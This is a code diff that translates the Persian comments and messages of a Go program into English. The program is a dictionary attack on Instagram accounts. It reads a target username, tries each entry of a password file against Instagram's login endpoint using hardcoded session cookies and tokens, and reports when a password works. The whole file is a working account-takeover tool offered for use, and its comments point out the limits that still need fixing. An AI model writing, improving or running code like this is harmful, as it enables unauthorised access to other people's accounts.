@@ -11,53 +11,52 @@ import (
 	"time"
 )
 
-// --- بخش تنظیمات ---
+// --- Configuration Section ---
 const (
-	// آدرس URL برای ورود (همان نقطه پایانی AJAX که قبلاً استفاده می‌کردید)
+	// Login URL (the same AJAX endpoint you were using before)
 	loginURL = "https://www.instagram.com/accounts/login/ajax/"
 
-	// نام فیلدهای فرم
+	// Form field names
 	usernameField    = "username"
-	passwordField    = "enc_password" // توجه: پیشوند رمزگذاری هنوز در تابع tryPassword ثابت است
+	passwordField    = "enc_password" // Note: The encryption prefix is still hardcoded in the tryPassword function
 	optIntoOneTap    = "optIntoOneTap"
 	queryParams      = "queryParams"
 	trustedDeviceRec = "trustedDeviceRecords"
 	loginAttemptCount = "loginAttemptCount"
 	isPrivacyPortalReq = "isPrivacyPortalReq"
 
-
-	// نام فایل حاوی رمزهای عبور
+	// File containing passwords
 	passwordsFile = "password.txt"
 
-	// تاخیر بین تلاش‌ها (به ثانیه)
+	// Delay between attempts (in seconds)
 	retryDelaySeconds = 2
 )
 
-// هدرهای HTTP (برخی مقادیر نمونه هستند یا نیاز به تولید پویا دارند)
-// نکته مهم: توکن‌های ثابت مانند CSRFToken و کوکی‌ها به احتمال زیاد مشکل‌ساز خواهند بود
-// زیرا به جلسه (session) خاصی وابسته‌اند و منقضی می‌شوند. این یک محدودیت بزرگ است.
+// HTTP Headers (some values are examples or may need dynamic generation)
+// Important Note: Hardcoded tokens like CSRFToken and cookies will likely cause issues
+// as they are session-specific and expire. This is a major limitation.
 var defaultHeaders = map[string]string{
 	"User-Agent":       "Instagram 76.0.0.15.395 Android (24/7.0; 640dpi; 1440x2560; samsung; SM-G930F; herolte; samsungexynos8890; en_US; 138226743)",
-	"X-CSRFToken":      "z2y86ITZAahahOfRghvrCF3PlUj4wx8N", // مثال: این باید پویا باشد
-	"X-Instagram-AJAX": "1023134472",                     // مثال: این ممکن است تغییر کند
+	"X-CSRFToken":      "z2y86ITZAahahOfRghvrCF3PlUj4wx8N", // Example: This should be dynamic
+	"X-Instagram-AJAX": "1023134472",                     // Example: This might change
 	"X-Requested-With": "XMLHttpRequest",
 	"Referer":          "https://www.instagram.com/accounts/login/",
 	"Origin":           "https://www.instagram.com",
 	"Content-Type":     "application/x-www-form-urlencoded",
-	"X-IG-App-ID":      "936619743392459",                    // مثال: این ممکن است تغییر کند
-	"X-IG-WWW-Claim":   "hmac.AR0yguz-o9CzH6COPm6FWASXsTwt-9uGK8POXdrEwr7UYcqC", // مثال: این باید پویا باشد
-	"Cookie":           `csrftoken=z2y86ITZAahahOfRghvrCF3PlUj4wx8N; mid=aDCkugALAAE0mwBUT4-2EUrl5ufw; ig_did=1E68718D-4352-40B7-AEFF-BBEDAD4A4091; rur="VLL,50771762250,1779555557:01f7212..."`, // مثال: اینها مربوط به یک جلسه خاص هستند
+	"X-IG-App-ID":      "936619743392459",                    // Example: This might change
+	"X-IG-WWW-Claim":   "hmac.AR0yguz-o9CzH6COPm6FWASXsTwt-9uGK8POXdrEwr7UYcqC", // Example: This should be dynamic
+	"Cookie":           `csrftoken=z2y86ITZAahahOfRghvrCF3PlUj4wx8N; mid=aDCkugALAAE0mwBUT4-2EUrl5ufw; ig_did=1E68718D-4352-40B7-AEFF-BBEDAD4A4091; rur="VLL,50771762250,1779555557:01f7212..."`, // Example: These are session-specific
 }
 
-// حالت اشکال‌زدایی (Debug Mode)
-// اگر true باشد، لاگ‌های دقیق‌تری نمایش داده می‌شود. برای خروجی کمتر false قرار دهید.
+// Debug Mode
+// If true, more detailed logs will be displayed. Set to false for less output.
 var debugMode = true
-// --- پایان بخش تنظیمات ---
+// --- End of Configuration Section ---
 
 func tryPassword(username, password string) bool {
 	data := url.Values{}
-	// توجه: فرمت رمزگذاری #PWD_INSTAGRAM_BROWSER:10:<timestamp>:<password>
-	// خاص است و timestamp در اینجا ثابت است. این یک محدودیت قابل توجه است.
+	// Note: The #PWD_INSTAGRAM_BROWSER:10:<timestamp>:<password> encryption format
+	// is specific, and the timestamp here is static. This is a significant limitation.
 	data.Set(passwordField, "#PWD_INSTAGRAM_BROWSER:10:1748019955:"+password)
 	data.Set(usernameField, username)
 	data.Set(optIntoOneTap, "false")
@@ -67,26 +66,26 @@ func tryPassword(username, password string) bool {
     data.Set(isPrivacyPortalReq, "false")
 
 	client := &http.Client{
-		Timeout: 30 * time.Second, // یک وقفه زمانی (timeout) برای کلاینت اضافه شد
+		Timeout: 30 * time.Second, // A timeout was added for the client
 	}
 	req, err := http.NewRequest("POST", loginURL, strings.NewReader(data.Encode()))
 	if err != nil {
 		if debugMode {
-			fmt.Println("خطا در ایجاد درخواست:", err)
+			fmt.Println("Error creating request:", err)
 		}
 		return false
 	}
 
-	// تنظیم هدرها از بخش تنظیمات
+	// Set headers from the configuration
 	for key, value := range defaultHeaders {
 		req.Header.Set(key, value)
 	}
 
 	if debugMode {
-		fmt.Println("\n--- تلاش برای رمز عبور:", password, "---")
-		fmt.Println("ارسال درخواست به:", loginURL)
-		// fmt.Println("با داده‌های فرم:", data.Encode()) // نمایش داده‌های فرم ممکن است طولانی باشد
-		fmt.Println("با هدرها:")
+		fmt.Println("\n--- Attempting password:", password, "---")
+		fmt.Println("Sending request to:", loginURL)
+		// fmt.Println("With form data:", data.Encode()) // Displaying form data might be verbose
+		fmt.Println("With headers:")
 		for key, values := range req.Header {
 			fmt.Printf("  %s: %s\n", key, strings.Join(values, ", "))
 		}
@@ -95,7 +94,7 @@ func tryPassword(username, password string) bool {
 	resp, err := client.Do(req)
 	if err != nil {
 		if debugMode {
-			fmt.Println("خطا در ارسال درخواست:", err)
+			fmt.Println("Error sending request:", err)
 		}
 		return false
 	}
@@ -104,31 +103,31 @@ func tryPassword(username, password string) bool {
 	bodyBytes, err := io.ReadAll(resp.Body)
 	if err != nil {
 		if debugMode {
-			fmt.Println("خطا در خواندن پاسخ:", err)
+			fmt.Println("Error reading response:", err)
 		}
 		return false
 	}
 	body := string(bodyBytes)
 
 	if debugMode {
-		fmt.Println("وضعیت پاسخ:", resp.StatusCode)
-		fmt.Println("بدنه پاسخ:", body)
+		fmt.Println("Response status:", resp.StatusCode)
+		fmt.Println("Response body:", body)
 	}
 
-	// شرط موفقیت اصلی شما
+	// Your original success condition
 	if resp.StatusCode == 200 && strings.Contains(body, `"authenticated":true`) {
 		return true
 	}
 
-	// بررسی اضافی برای چالش امنیتی جهت وضوح بیشتر در حالت debug
+	// Additional check for security challenge for more clarity in debug mode
 	if strings.Contains(body, `"challenge_required"`) || resp.StatusCode == 400 {
 		if debugMode {
-			fmt.Println("!!! هشدار: چالش امنیتی توسط اینستاگرام شناسایی شد یا درخواست نامعتبر بود (کد: ", resp.StatusCode, ") !!!")
+			fmt.Println("!!! Warning: Security challenge detected by Instagram or bad request (Code: ", resp.StatusCode, ") !!!")
 		}
 	}
     if resp.StatusCode == 404 {
         if debugMode {
-            fmt.Println("!!! هشدار: آدرس URL مقصد (", loginURL, ") پیدا نشد (404) !!!")
+            fmt.Println("!!! Warning: Target URL (", loginURL, ") not found (404) !!!")
         }
     }
 
@@ -136,49 +135,49 @@ func tryPassword(username, password string) bool {
 }
 
 func main() {
-	fmt.Print("نام کاربری را وارد کنید: ")
+	fmt.Print("Enter username: ")
 	var username string
 	fmt.Scanln(&username)
 
 	file, err := os.Open(passwordsFile)
 	if err != nil {
-		fmt.Println("خطا در باز کردن فایل رمزهای عبور (", passwordsFile, "):", err)
+		fmt.Println("Error opening passwords file (", passwordsFile, "):", err)
 		return
 	}
 	defer file.Close()
 
 	if debugMode {
-		fmt.Println("شروع خواندن رمزها از فایل:", passwordsFile)
+		fmt.Println("Starting to read passwords from file:", passwordsFile)
 	}
 
 	scanner := bufio.NewScanner(file)
 	passwordFound := false
 	for scanner.Scan() {
 		password := scanner.Text()
-		if password == "" { // رد کردن خطوط خالی
+		if password == "" { // Skip empty lines
 			continue
 		}
 
-		fmt.Println("\nدر حال تلاش برای رمز عبور:", password) // این پیام اصلی باقی می‌ماند
+		fmt.Println("\nAttempting password:", password) // This main message remains
 
 		if tryPassword(username, password) {
 			fmt.Println("\n******************************")
-			fmt.Println("      رمز عبور پیدا شد:", password)
+			fmt.Println("      Password found:", password)
 			fmt.Println("******************************")
 			passwordFound = true
 			break
 		}
 		if debugMode {
-			fmt.Println("--- پایان تلاش برای رمز عبور:", password, "---")
+			fmt.Println("--- End of attempt for password:", password, "---")
 		}
 		time.Sleep(retryDelaySeconds * time.Second)
 	}
 
 	if err := scanner.Err(); err != nil {
-		fmt.Println("خطا در خواندن فایل رمزهای عبور:", err)
+		fmt.Println("Error reading passwords file:", err)
 	}
 
 	if !passwordFound {
-        fmt.Println("\nپردازش فایل رمزهای عبور تمام شد. رمز عبوری پیدا نشد.")
+        fmt.Println("\nFinished processing passwords file. No password was found.")
     }
 }
